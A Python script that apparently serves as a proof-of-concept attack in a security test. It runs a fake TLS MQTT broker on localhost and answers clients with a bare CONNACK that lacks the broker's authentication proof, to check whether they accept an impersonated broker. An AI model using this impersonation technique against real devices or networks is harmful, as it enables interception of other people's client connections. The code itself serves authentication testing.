import socket
import ssl
import threading
import time

HOST = "127.0.0.1"
PORT = 1884

def handle_client(conn, addr):
    print(f"[FAKE BROKER] Client connected from {addr}")
    try:
        data = conn.recv(4096)
        print(f"[FAKE BROKER] Received {len(data)} bytes (CONNECT packet)")

        # Send fake CONNACK with no brokerNonce/brokerProof/brokerCredential
        # MQTT5 CONNACK: 0x20 = packet type, 0x03 = remaining length
        # 0x00 = session present, 0x00 = success, 0x00 = no properties
        connack = bytes([0x20, 0x03, 0x00, 0x00, 0x00])
        conn.send(connack)
        print(f"[FAKE BROKER] Sent fake CONNACK (missing brokerProof!)")

        time.sleep(5)
    except Exception as e:
        print(f"[FAKE BROKER] Error: {e}")
    finally:
        conn.close()
        print(f"[FAKE BROKER] Connection closed")

def main():
    print(f"[FAKE BROKER] Starting TLS broker on {HOST}:{PORT}")

    # Use broker's own certificate to impersonate
    # In real attack, attacker would use self-signed cert
    tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    tls_ctx.load_cert_chain(
        certfile="attack/fake_broker.crt",
        keyfile="attack/fake_broker.key"
    )
    tls_ctx.check_hostname = False
    tls_ctx.verify_mode = ssl.CERT_NONE

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)

    tls_server = tls_ctx.wrap_socket(server, server_side=True)
    print(f"[FAKE BROKER] Listening for victims on port {PORT}...")

    while True:
        try:
            conn, addr = tls_server.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr))
            t.start()
        except Exception as e:
            print(f"[FAKE BROKER] Accept error: {e}")

if __name__ == "__main__":
    main()
